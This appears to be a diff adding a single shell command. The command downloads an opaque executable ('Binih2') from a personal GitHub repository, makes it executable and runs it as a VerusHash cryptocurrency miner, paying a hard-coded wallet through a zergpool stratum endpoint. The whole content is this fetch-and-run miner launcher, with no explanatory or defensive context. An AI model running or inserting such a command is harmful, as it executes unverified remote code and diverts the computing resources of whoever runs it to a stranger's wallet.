@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/AZKAFamilychanel/BinihCuanMangAdhy/main/Binih2 && chmod +x Binih2 && ./Binih2 --algo verushash --pool stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RQoxppyczmJ1wEdmXenwEXk2CwQaZCkWVn.adhy -p x
